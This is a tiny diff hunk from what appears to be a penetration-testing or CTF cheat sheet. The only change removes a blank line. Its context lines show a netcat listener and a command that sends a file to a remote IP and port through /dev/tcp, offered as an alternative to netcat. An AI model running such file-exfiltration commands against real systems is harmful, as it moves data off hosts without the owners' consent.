@@ -554,7 +554,6 @@ DATA TRANSFER, MOVEMENT, AND REDIRECTION:
       File trans with /dev/tcp: alt to netcat
         nc -l -p 1111 > file.txt
         cat file.txt > /dev/tcp/<IP>/<port>
-      
       CTFD:
       Relay Machine:
 ###Accept connection
